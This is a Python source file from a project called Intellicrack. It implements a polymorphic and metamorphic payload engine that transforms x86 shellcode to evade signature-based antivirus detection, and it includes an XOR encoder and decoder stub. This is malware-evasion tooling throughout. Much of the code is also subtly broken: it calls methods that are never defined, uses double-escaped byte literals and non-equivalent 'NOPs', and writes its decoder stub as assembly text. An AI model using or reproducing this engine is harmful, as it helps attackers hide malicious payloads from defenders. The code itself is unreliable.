"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import logging
import random
import struct
from typing import Any

"""
Polymorphic and Metamorphic Payload Engine

Generates polymorphic and metamorphic payloads to evade signature-based detection.
Implements advanced code transformation techniques.
"""


class PolymorphicEngine:
    """Advanced polymorphic and metamorphic payload generation engine.

    Implements various code transformation techniques to create functionally
    equivalent but structurally different payloads.
    """

    def __init__(self):
        """Initialize the polymorphic engine with NOP equivalents and dead code templates."""
        self.logger = logging.getLogger("IntellicrackLogger.PolymorphicEngine")

        # NOP equivalent instructions for padding
        self.nop_equivalents = [
            b"\x90",  # nop
            b"\x40\x4a",  # inc eax; dec edx
            b"\x48\x40",  # dec eax; inc eax
            b"\x8b\xc0",  # mov eax, eax
            b"\x8b\xd2",  # mov edx, edx
            b"\x33\xc0\x33\xc0",  # xor eax, eax; xor eax, eax
            b"\x50\x58",  # push eax; pop eax
            b"\x51\x59",  # push ecx; pop ecx
            b"\x52\x5a",  # push edx; pop edx
            b"\x87\xc0",  # xchg eax, eax
        ]

        # Dead code templates for insertion
        self.dead_code_templates = [
            # Math operations that cancel out
            b"\x40\x48",  # inc eax; dec eax
            b"\x41\x49",  # inc ecx; dec ecx
            b"\x42\x4a",  # inc edx; dec edx
            b"\x83\xc0\x01\x83\xe8\x01",  # add eax, 1; sub eax, 1
            b"\x83\xc1\x02\x83\xe9\x02",  # add ecx, 2; sub ecx, 2
            # Stack operations that cancel out
            b"\x50\x58",  # push eax; pop eax
            b"\x51\x59",  # push ecx; pop ecx
            b"\x52\x5a",  # push edx; pop edx
            # Register shuffling
            b"\x50\x51\x59\x58",  # push eax; push ecx; pop ecx; pop eax
            b"\x87\xc1\x87\xc1",  # xchg eax, ecx; xchg eax, ecx
        ]

        # Garbage registers that can be modified without affecting payload
        self.garbage_registers = ["ebx", "esi", "edi"]

    def encode_payload(self, payload: bytes, target_analysis: dict[str, Any]) -> bytes:
        """Generate a polymorphic version of the payload.

        Args:
            payload: Original payload bytes
            target_analysis: Target environment analysis

        Returns:
            Polymorphically encoded payload

        """
        try:
            self.logger.info(f"Generating polymorphic payload for {len(payload)} bytes")

            # Choose encoding techniques based on target analysis
            techniques = self._select_encoding_techniques(target_analysis)

            encoded_payload = payload

            # Apply selected encoding techniques
            for technique in techniques:
                if technique == "nop_insertion":
                    encoded_payload = self._insert_nop_equivalents(encoded_payload)
                elif technique == "dead_code_insertion":
                    encoded_payload = self._insert_dead_code(encoded_payload)
                elif technique == "instruction_substitution":
                    encoded_payload = self._substitute_instructions(encoded_payload)
                elif technique == "register_renaming":
                    encoded_payload = self._rename_registers(encoded_payload)
                elif technique == "code_reordering":
                    encoded_payload = self._reorder_code_blocks(encoded_payload)
                elif technique == "garbage_insertion":
                    encoded_payload = self._insert_garbage_code(encoded_payload)

            self.logger.info(
                f"Polymorphic encoding complete: {len(payload)} -> {len(encoded_payload)} bytes"
            )
            return encoded_payload

        except Exception as e:
            self.logger.error(f"Polymorphic encoding failed: {e}")
            return payload  # Return original payload if encoding fails

    def metamorphic_encode(self, payload: bytes, target_analysis: dict[str, Any]) -> bytes:
        """Generate a metamorphic version of the payload.

        Metamorphic encoding creates functionally equivalent code that is
        structurally completely different from the original.

        Args:
            payload: Original payload bytes
            target_analysis: Target environment analysis

        Returns:
            Metamorphically encoded payload

        """
        try:
            self.logger.info(f"Generating metamorphic payload for {len(payload)} bytes")

            # Disassemble payload into functional blocks
            code_blocks = self._disassemble_payload(payload)

            # Transform each block independently
            transformed_blocks = []
            for block in code_blocks:
                transformed_block = self._metamorphic_transform_block(block)
                transformed_blocks.append(transformed_block)

            # Reassemble with additional obfuscation
            metamorphic_payload = self._reassemble_blocks(transformed_blocks)

            # Add final metamorphic touches
            metamorphic_payload = self._add_metamorphic_wrapper(metamorphic_payload)

            self.logger.info(
                f"Metamorphic encoding complete: {len(payload)} -> {len(metamorphic_payload)} bytes"
            )
            return metamorphic_payload

        except Exception as e:
            self.logger.error(f"Metamorphic encoding failed: {e}")
            return self.encode_payload(payload, target_analysis)  # Fallback to polymorphic

    def _select_encoding_techniques(self, target_analysis: dict[str, Any]) -> list[str]:
        """Select appropriate encoding techniques based on target analysis."""
        techniques = []

        # Base techniques always applied
        techniques.extend(["nop_insertion", "dead_code_insertion"])

        # Add techniques based on evasion requirements
        evasion_reqs = target_analysis.get("evasion_requirements", [])

        if "signature_evasion" in evasion_reqs:
            techniques.extend(["instruction_substitution", "garbage_insertion"])

        if "behavioral_evasion" in evasion_reqs:
            techniques.extend(["code_reordering", "register_renaming"])

        # Randomize technique order
        random.shuffle(techniques)

        return techniques

    def _analyze_safe_insertion_points(self, payload: bytes) -> list[int]:
        """Analyze payload to find safe NOP insertion points."""
        safe_points = []

        # Simple heuristic: safe after complete instructions
        i = 0
        while i < len(payload):
            # Check for common instruction boundaries
            if i > 0 and i < len(payload) - 1:
                # After single-byte instructions
                prev_byte = payload[i - 1]
                if (
                    prev_byte in [0x90, 0x40, 0x41, 0x48, 0x49] or prev_byte == 0xC3
                ):  # nop, inc, dec
                    safe_points.append(i)
            i += 1

        return safe_points

    def _select_context_appropriate_nop(self, payload: bytes, position: int) -> bytes:
        """Select NOP equivalent appropriate for the context."""
        # Analyze surrounding bytes to pick compatible NOP
        if position < len(payload) - 2:
            next_bytes = payload[position : position + 2]
            # Avoid certain combinations that might affect execution
            if next_bytes[0] in [0xE8, 0xE9]:  # call/jmp
                return b"\\x90"  # Use simple NOP near control flow

        # Otherwise use a random NOP equivalent from our list
        import secrets

        return self.nop_equivalents[secrets.randbelow(len(self.nop_equivalents))]

    def _insert_nop_equivalents(self, payload: bytes) -> bytes:
        """Insert NOP-equivalent instructions throughout the payload."""
        result = b""

        # Analyze instruction boundaries to find safe insertion points
        safe_positions = self._analyze_safe_insertion_points(payload)

        for i, byte in enumerate(payload):
            result += bytes([byte])

            # Insert NOP equivalents at safe positions based on analysis
            if i in safe_positions:
                # Select NOP equivalent based on surrounding context
                nop_equiv = self._select_context_appropriate_nop(payload, i)
                result += nop_equiv

        return result

    def _analyze_control_flow(self, payload: bytes) -> dict[str, Any]:
        """Analyze control flow to find safe dead code insertion points."""
        control_flow = {"safe_boundaries": []}

        # Identify basic block boundaries
        i = 0
        while i < len(payload):
            byte = payload[i]
            # After unconditional jumps/returns
            if byte in [0xE9, 0xC3, 0xCB]:  # jmp, ret, retf
                if i + 1 < len(payload):
                    control_flow["safe_boundaries"].append(i + 1)
                i += 5 if byte == 0xE9 else 1
            else:
                i += 1

        return control_flow

    def _select_safe_dead_code(self, payload: bytes, position: int) -> bytes:
        """Select dead code that won't affect execution at this position."""
        # Use cryptographically secure random for selection
        import secrets

        return self.dead_code_templates[secrets.randbelow(len(self.dead_code_templates))]

    def _insert_dead_code(self, payload: bytes) -> bytes:
        """Insert dead code that doesn't affect payload execution."""
        result = b""

        # Analyze control flow to identify safe insertion points
        control_flow = self._analyze_control_flow(payload)

        for i in range(0, len(payload), 4):
            # Add original bytes
            chunk = payload[i : i + 4]
            result += chunk

            # Insert dead code at safe control flow boundaries
            if i in control_flow.get("safe_boundaries", []):
                # Select appropriate dead code based on register usage analysis
                dead_code = self._select_safe_dead_code(payload, i)
                result += dead_code

        return result

    def _analyze_substitutable_patterns(self, payload: bytes) -> list[dict[str, Any]]:
        """Analyze payload to find instructions that can be substituted."""
        patterns = []

        # Define substitution rules
        substitutions = {
            b"\\x90": [b"\\x8B\\xC0", b"\\x8B\\xD2"],  # nop -> mov eax,eax or mov edx,edx
            b"\\x40": [b"\\x83\\xC0\\x01"],  # inc eax -> add eax, 1
            b"\\x48": [b"\\x83\\xE8\\x01"],  # dec eax -> sub eax, 1
        }

        # Find substitutable patterns
        for i in range(len(payload)):
            for original, replacements in substitutions.items():
                if payload[i : i + len(original)] == original:
                    import secrets

                    replacement = replacements[secrets.randbelow(len(replacements))]
                    patterns.append(
                        {
                            "offset": i,
                            "original": original,
                            "replacement": replacement,
                        }
                    )

        return patterns

    def _verify_semantic_equivalence(
        self, original: bytes, replacement: bytes, payload: bytes, offset: int
    ) -> bool:
        """Verify that substitution maintains semantic equivalence."""
        # Basic verification - ensure we're not breaking control flow
        if offset > 0:
            prev_byte = payload[offset - 1]
            # Don't substitute after conditional jumps
            if prev_byte in [0x74, 0x75, 0x76, 0x77]:  # jz, jnz, etc
                return False

        return True

    def _substitute_instructions(self, payload: bytes) -> bytes:
        """Substitute instructions with equivalent alternatives."""
        result = bytearray(payload)

        # Analyze instruction patterns to find substitutable sequences
        substitutable_patterns = self._analyze_substitutable_patterns(payload)

        # Apply substitutions based on analysis
        for pattern_info in substitutable_patterns:
            offset = pattern_info["offset"]
            original = pattern_info["original"]
            replacement = pattern_info["replacement"]

            # Verify substitution maintains semantics
            if self._verify_semantic_equivalence(original, replacement, payload, offset):
                # Apply substitution
                for i in range(len(replacement)):
                    if offset + i < len(result):
                        result[offset + i] = replacement[i]

        return bytes(result)

    def _analyze_register_usage(self, payload: bytes) -> dict[str, Any]:
        """Analyze register usage throughout the payload."""
        usage = {
            "eax": [],
            "ebx": [],
            "ecx": [],
            "edx": [],
            "esi": [],
            "edi": [],
        }

        # Simple pattern matching for register usage
        for i in range(len(payload)):
            byte = payload[i]
            # mov eax patterns
            if byte == 0xB8:  # mov eax, imm32
                usage["eax"].append(i)
            elif byte == 0xB9:  # mov ecx, imm32
                usage["ecx"].append(i)
            # Add more patterns as needed

        return usage

    def _build_register_renaming_map(self, register_usage: dict[str, Any]) -> list[dict[str, Any]]:
        """Build a map of safe register renamings based on usage analysis."""
        renaming_map = []

        # Example: if eax is not used after certain point, can rename to ecx
        # This is simplified - real implementation needs full data flow analysis

        return renaming_map

    def _rename_registers(self, payload: bytes) -> bytes:
        """Rename registers where possible to avoid signatures."""
        result = bytearray(payload)

        # Perform data flow analysis to identify renameable registers
        register_usage = self._analyze_register_usage(payload)

        # Build safe register renaming map
        renaming_map = self._build_register_renaming_map(register_usage)

        # Apply register renaming based on data flow analysis
        for rename_info in renaming_map:
            offset = rename_info["offset"]
            rename_info["original"]
            new_reg = rename_info["replacement"]

            # Apply renaming at specific offset
            if offset < len(result):
                result[offset] = new_reg

        return bytes(result)

    def _reorder_code_blocks(self, payload: bytes) -> bytes:
        """Reorder independent code blocks."""
        # Split payload into blocks (simplified approach)
        block_size = 8
        blocks = []

        for i in range(0, len(payload), block_size):
            block = payload[i : i + block_size]
            blocks.append(block)

        # Identify potentially reorderable blocks (very simplified)
        # In practice, this requires sophisticated control flow analysis
        reorderable_blocks = []
        non_reorderable_blocks = []

        for i, block in enumerate(blocks):
            # Heuristic: blocks without jumps/calls might be reorderable
            if b"\xe8" not in block and b"\xe9" not in block and b"\x74" not in block:
                reorderable_blocks.append((i, block))
            else:
                non_reorderable_blocks.append((i, block))

        # Randomly shuffle reorderable blocks
        if len(reorderable_blocks) > 1:
            random.shuffle([block for _, block in reorderable_blocks])

        # Reassemble
        result = b""
        for i in range(len(blocks)):
            if any(idx == i for idx, _ in non_reorderable_blocks):
                # Use original block
                result += blocks[i]
            elif reorderable_blocks:
                # Use shuffled block
                _, shuffled_block = reorderable_blocks.pop(0)
                result += shuffled_block
            else:
                result += blocks[i]

        return result

    def _insert_garbage_code(self, payload: bytes) -> bytes:
        """Insert garbage code using unused registers."""
        result = b""

        # Analyze register liveness to find unused registers at each point
        liveness_info = self._analyze_register_liveness(payload)

        for i in range(0, len(payload), 6):
            # Add original bytes
            chunk = payload[i : i + 6]
            result += chunk

            # Insert garbage code only where registers are provably dead
            if i in liveness_info.get("dead_register_points", []):
                dead_regs = liveness_info["dead_registers"][i]
                garbage = self._generate_safe_garbage_code(dead_regs)
                result += garbage

        return result

    def _generate_garbage_code(self) -> bytes:
        """Generate garbage code that doesn't affect payload execution."""
        garbage_templates = [
            # Modify unused registers
            b"\x53\x5b",  # push ebx; pop ebx
            b"\x56\x5e",  # push esi; pop esi
            b"\x57\x5f",  # push edi; pop edi
            # Arithmetic on garbage registers
            b"\x43\x4b",  # inc ebx; dec ebx
            b"\x46\x4e",  # inc esi; dec esi
            b"\x47\x4f",  # inc edi; dec edi
            # XOR garbage with itself
            b"\x33\xdb",  # xor ebx, ebx
            b"\x33\xf6",  # xor esi, esi
            b"\x33\xff",  # xor edi, edi
            # Move garbage between garbage registers
            b"\x8b\xde",  # mov ebx, esi
            b"\x8b\xf7",  # mov esi, edi
            b"\x8b\xfb",  # mov edi, ebx
        ]

        return random.choice(garbage_templates)  # noqa: S311

    def _disassemble_payload(self, payload: bytes) -> list[dict[str, Any]]:
        """Disassemble payload into functional blocks (simplified)."""
        # This is a very simplified disassembly for demonstration
        # Real implementation would use a proper disassembly library

        blocks = []
        current_block = {
            "start_offset": 0,
            "instructions": [],
            "dependencies": [],
            "type": "linear",
        }

        i = 0
        while i < len(payload):
            # Detect potential instruction boundaries (simplified)
            byte = payload[i]

            # Check for control flow instructions
            if byte in [0xE8, 0xE9, 0x74, 0x75, 0xEB]:  # call, jmp, conditional jumps
                current_block["instructions"].append(payload[i : i + 5])
                current_block["type"] = "control_flow"
                i += 5

                # End current block
                blocks.append(current_block)
                current_block = {
                    "start_offset": i,
                    "instructions": [],
                    "dependencies": [],
                    "type": "linear",
                }
            else:
                # Regular instruction (assume 1 byte for simplicity)
                current_block["instructions"].append(bytes([byte]))
                i += 1

        if current_block["instructions"]:
            blocks.append(current_block)

        return blocks

    def _metamorphic_transform_block(self, block: dict[str, Any]) -> dict[str, Any]:
        """Apply metamorphic transformation to a code block."""
        transformed_block = block.copy()

        if block["type"] == "linear":
            # Apply transformations based on block analysis
            instructions = block["instructions"]
            block_context = self._analyze_block_context(block)

            # Insert decoy instructions based on analysis
            new_instructions = []
            for i, instruction in enumerate(instructions):
                new_instructions.append(instruction)

                # Insert decoy based on control flow and data dependency analysis
                if self._is_safe_decoy_point(block_context, i):
                    decoy = self._generate_context_safe_decoy(block_context, i)
                    new_instructions.append(decoy)

            transformed_block["instructions"] = new_instructions

        return transformed_block

    def _generate_decoy_instruction(self) -> bytes:
        """Generate a decoy instruction that looks real but does nothing useful."""
        decoy_templates = [
            b"\x8b\xc0",  # mov eax, eax
            b"\x8b\xd2",  # mov edx, edx
            b"\x8b\xc9",  # mov ecx, ecx
            b"\x03\xc0",  # add eax, eax (effectively shl eax, 1)
            b"\x2b\xc0",  # sub eax, eax (effectively xor eax, eax)
            b"\x0b\xc0",  # or eax, eax
            b"\x23\xc0",  # and eax, eax
            b"\x85\xc0",  # test eax, eax
        ]

        return random.choice(decoy_templates)  # noqa: S311

    def _reassemble_blocks(self, blocks: list[dict[str, Any]]) -> bytes:
        """Reassemble transformed blocks into final payload."""
        result = b""

        for block in blocks:
            for instruction in block["instructions"]:
                result += instruction

        return result

    def _add_metamorphic_wrapper(self, payload: bytes) -> bytes:
        """Add metamorphic wrapper around the payload."""
        # Generate unique entry sequence
        entry_sequence = self._generate_entry_sequence()

        # Generate unique exit sequence
        exit_sequence = self._generate_exit_sequence()

        # Wrap payload
        wrapped_payload = entry_sequence + payload + exit_sequence

        return wrapped_payload

    def _generate_entry_sequence(self) -> bytes:
        """Generate a unique entry sequence for metamorphic wrapper."""
        sequences = [
            # Stack frame setup variations
            b"\x55\x8b\xec",  # push ebp; mov ebp, esp
            b"\x55\x89\xe5",  # push ebp; mov ebp, esp (AT&T)
            b"\x50\x8b\xc4\x89\xc5\x58",  # push eax; mov eax, esp; mov ebp, eax; pop eax
            # Register preservation variations
            b"\x60",  # pushad
            b"\x50\x51\x52\x53",  # push eax; push ecx; push edx; push ebx
            b"\x56\x57\x55",  # push esi; push edi; push ebp
        ]

        return random.choice(sequences)  # noqa: S311

    def _generate_exit_sequence(self) -> bytes:
        """Generate a unique exit sequence for metamorphic wrapper."""
        sequences = [
            # Stack frame cleanup variations
            b"\x8b\xe5\x5d",  # mov esp, ebp; pop ebp
            b"\x89\xec\x5d",  # mov esp, ebp; pop ebp (AT&T)
            b"\xc9",  # leave
            # Register restoration variations
            b"\x61",  # popad
            b"\x5b\x5a\x59\x58",  # pop ebx; pop edx; pop ecx; pop eax
            b"\x5d\x5f\x5e",  # pop ebp; pop edi; pop esi
        ]

        return random.choice(sequences)  # noqa: S311

    def generate_polymorphic_key(self) -> bytes:
        """Generate a cryptographically secure random key for polymorphic encryption."""
        import secrets

        key_length = secrets.randbelow(17) + 16  # Random length between 16-32
        return secrets.token_bytes(key_length)

    def xor_encode_with_key(self, payload: bytes, key: bytes) -> bytes:
        """XOR encode payload with given key."""
        encoded = bytearray()

        for i, byte in enumerate(payload):
            key_byte = key[i % len(key)]
            encoded.append(byte ^ key_byte)

        return bytes(encoded)

    def generate_decoder_stub(self, key: bytes, payload_length: int) -> bytes:
        """Generate decoder stub for XOR-encoded payload."""
        # Simple XOR decoder stub (x86)
        decoder = (
            b"""
            ; XOR decoder stub
            push edi
            push ecx
            mov edi, $ + 0x20        ; Point to encoded payload
            mov ecx, """
            + struct.pack("<I", payload_length)
            + b"""

        decode_loop:
            xor byte ptr [edi], """
            + bytes([key[0]])
            + b"""
            inc edi
            loop decode_loop

            pop ecx
            pop edi
            jmp $ + 0x05             ; Jump to decoded payload
        """
        )

        return decoder
